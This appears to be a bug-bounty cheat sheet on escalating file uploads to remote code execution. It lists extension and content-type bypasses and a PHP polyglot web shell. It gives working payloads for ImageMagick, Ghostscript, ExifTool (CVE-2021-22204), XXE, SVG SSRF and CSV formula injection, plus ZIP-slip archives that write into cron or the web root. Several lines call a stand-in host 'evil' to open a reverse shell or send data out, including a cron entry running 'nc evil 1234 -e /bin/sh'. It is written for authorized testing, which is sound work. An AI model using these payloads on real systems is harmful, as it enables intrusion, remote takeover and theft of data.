# File Upload to RCE — every $10K+ pattern

> H1 hits: GitLab ExifTool $20K, Shopify Scripts struct confusion $18K. Plus countless smaller bounties.

---

## SURFACE — where uploads live

- avatar / profile picture
- attachments (issues, comments, tickets, chat)
- import features (CSV, JSON, XML, ZIP, TAR, backups)
- document conversion (Word -> PDF, image -> thumbnail)
- KYC / ID verification (often runs OCR / EXIF parser)
- expense receipts, invoices, certificates
- email attachment processors
- third-party content imports (Slack import, Trello import)

---

## STAGE 1 — Detect what runs server-side

Upload these in order, watch responses:

1. Plain `.txt` -> baseline path
2. `.html` -> XSS sink? content sniffed?
3. `.svg` -> XSS / XXE / SSRF
4. JPEG with EXIF metadata -> ExifTool? ImageMagick?
5. PDF with `/JS` action or `/URI` -> Ghostscript? PDF renderer?
6. ZIP with traversal entry -> archive lib used?
7. Office doc (DOCX) with macro / XXE -> Libre/Microsoft? Apache POI?
8. CSV with `=cmd|...` -> spreadsheet formula injection
9. EICAR test string -> AV running?

Note any stack traces, version banners, or differences in error response.

---

## STAGE 2 — Extension / content-type bypass

### Extension
- Double extension: `shell.php.jpg`, `shell.jpg.php`
- Less-known extensions: `.phtml`, `.phar`, `.phps`, `.pht`, `.php5`, `.php7`, `.cgi`, `.pl`, `.aspx`, `.cer`, `.jsp`, `.jspx`
- Case: `shell.PhP`, `shell.PHP`
- Trailing chars: `shell.php.`, `shell.php ` (space), `shell.php%00.jpg` (null byte)
- Special: `.htaccess` upload to enable `.png` as PHP

### Content-Type
- Send `Content-Type: image/jpeg` with PHP body
- Send conflicting type per part of multipart

### Magic bytes (server checks "is it a real image"?)
Polyglot: prepend valid magic bytes:
- GIF89a;<?php system($_GET[c]);?>
- JPEG: FF D8 FF E0 + comment marker holding payload
- PNG: 89 50 4E 47 + tEXt chunk
- ZIP: PK\x03\x04 + arbitrary bytes after

### Filename / path traversal in storage
- `../../var/www/x.jpg` -> sometimes lands outside upload dir
- Null byte: `../../etc/passwd%00.jpg` (older Java/PHP)
- UTF-8 / Unicode: `‮` (right-to-left override) reverses display

---

## STAGE 3 — Parser-specific RCE

### ImageMagick
- **ImageTragick** (CVE-2016-3714): `.mvg` or `.svg` with embedded MSL (`fill 'url(...|...)`)
- **CVE-2022-44268**: PNG profile read leak from server's local file
- Check via `magick --version` if exposed; or upload an MVG with a benign URL and watch OAST
- Mitigated by `policy.xml`. Test for misconfig: try a small MVG with `<image x="0" y="0" href="text:@/etc/passwd"/>` -> file content embedded in output thumbnail

### Ghostscript
- ImageMagick uses Ghostscript on PDF/EPS by default
- **CVE-2018-16509** through **CVE-2023-43654**: many GS sandbox escapes
- Upload a malicious PostScript `.eps`:
  ```postscript
  %!PS
  userdict /setpagedevice undef
  legal
  { null restore } stopped { pop } if
  legal
  mark /OutputFile (%pipe%id) currentdevice putdeviceprops
  ```
- Rendered as image -> command runs

### ExifTool (CVE-2021-22204) — GitLab $20K
- Upload a JPEG with malicious DjVu metadata:
  ```
  exiftool -DjVuANTz='(metadata "x" "$(id|nc evil 1234)")' file.jpg
  ```
- App's metadata removal pipeline runs ExifTool which parses DjVu -> RCE

### Libre / OpenOffice
- DOC/DOCX/ODT with macro auto-exec event
- Server-side conversion runs LibreOffice headless -> RCE if macros enabled
- Lower-impact: XXE in DOCX (XML inside ZIP) -> file read

### Apache POI / openpyxl / xlrd
- DOCX/XLSX = ZIP of XML — XXE in `[Content_Types].xml` if parser uses external entities

### PDF
- PDF JS: `/JS (app.alert(1))` -> sometimes runs in renderer
- PDF + Ghostscript chain (above)
- PDFBox / iText XXE on parse

### SVG
- XSS: `<svg><script>alert(1)</script></svg>` (when served as image/svg+xml directly to browser)
- XXE: `<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>`
- SSRF: `<image href="http://169.254.169.254/..."/>`
- XSLT (rare but powerful)

### XML / XSLT
See `xxe-deep.md`. XSLT extension functions in Saxon-PE/EE -> Java method calls -> RCE.

---

## STAGE 4 — ZIP slip / TAR traversal

When app extracts uploaded archives:

```python
# vulnerable
zipfile.ZipFile(uploaded).extractall(target_dir)
```

Craft archive with entries like `../../etc/cron.d/backdoor`, `../../var/www/shell.php`, `../../.git/hooks/post-update`.

Tools: `evilarc.py`, `slipit`, manual `python -c "import zipfile,os; z=zipfile.ZipFile('e.zip','w'); z.writestr('../../tmp/x','data'); z.close()"`.

Where this hits hardest:
- Backup/restore features (overwrite config)
- Theme/plugin install (write into web root)
- Source/repo import (overwrite git hooks; CI runs hook on next push)
- Deploy artifacts (write into deploy dir before next process load)

---

## STAGE 5 — CSV formula injection (DDE)

If app exports user-supplied data to CSV consumed in Excel:

```
=cmd|' /C calc'!A0
=HYPERLINK("http://evil/?d="&A1,"click")
@SUM(1+1)*cmd|' /C calc'!A0
+1+1+cmd|' /C calc'!A0
```

When victim opens CSV in Excel with macros enabled. Lower payout but still valid.

---

## STAGE 6 — Polyglot files

Files that are simultaneously valid as multiple types — useful when filter checks one type but parser uses another.

- **GIFAR**: GIF + JAR, signed JAR could be loaded as applet (legacy)
- **PHAR + JPEG**: PHAR valid as image, when accessed via `phar://` triggers PHP unsafe-deserialize
- **PDF + HTML / PDF + JS** for hosted XSS

Tool: `polyglotter`, `mitra`.

---

## STAGE 7 — XSS / SSRF as the secondary impact

If RCE isn't reachable:
- **Stored XSS** via SVG, HTML, PDF (when served inline to victims)
- **Stored XSS** via filename when filename is reflected unescaped
- **SSRF** via SVG `<image href>`, PDF `/URI`, Word `<img src>`
- **Blind XSS** in admin panel that views/processes uploads -> use XSSHunter / your beacon

---

## CHAIN RECIPES

### Recipe 1 — SVG -> XSS in admin -> CSRF admin -> plugin install -> RCE
1. Upload SVG with blind-XSS payload
2. Admin opens user profile -> SVG renders -> JS fires -> beacon
3. JS reads admin's CSRF token, calls `/admin/plugins/install` with attacker's malicious plugin URL
4. Plugin loads, executes installer -> RCE on web server

### Recipe 2 — ZIP slip in restore -> overwrite cron -> RCE
1. Confirm restore feature accepts ZIP
2. Craft ZIP with `../../etc/cron.d/x` containing `* * * * * root nc evil 1234 -e /bin/sh`
3. Restore extracts -> cron runs

### Recipe 3 — PDF + Ghostscript -> RCE -> read source / S3 creds
1. Upload PDF that triggers GS PostScript path
2. PoC with benign command: `id > /tmp/x`
3. Stop. Report. The chain continues theoretically to S3 / source code if you go further, but you've proven RCE.

---

## VALIDATION CHECKLIST

- Upload your file, confirm storage URL or processing happens
- Use OAST callback with unique ID per upload (so you know WHICH file fired)
- Capture: file bytes, upload request, server response, OAST hit log
- For RCE: benign commands only — id, hostname, `cat /etc/hostname`
- Stop before pivoting

---

## TOOLING

- ExifTool, ImageMagick (locally to craft payloads)
- `evilarc`, `slipit`, polyglotter, mitra
- Burp ext: Upload Scanner, Backslash Powered Scanner
- nuclei: `nuclei -t fuzzing-templates/ -t exposures/ -severity critical`
